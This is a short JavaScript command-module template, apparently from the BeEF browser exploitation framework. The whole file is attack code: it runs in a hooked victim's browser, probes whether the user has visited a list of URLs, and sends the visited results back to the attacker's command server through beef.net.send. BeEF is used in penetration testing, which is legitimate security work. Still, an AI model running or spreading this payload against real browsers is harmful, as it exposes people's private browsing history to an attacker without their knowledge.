beef.execute(function() {
	var results = beef.browser.hasVisited("<%== format_multiline(@urls) %>");
	var comp = '';
	for (var i=0; i < results.length; i++)
	{
		comp += results[i].url+' = '+results[i].visited+'  ';
	}
	beef.net.send("<%= @command_url %>", <%= @command_id %>, comp);
});

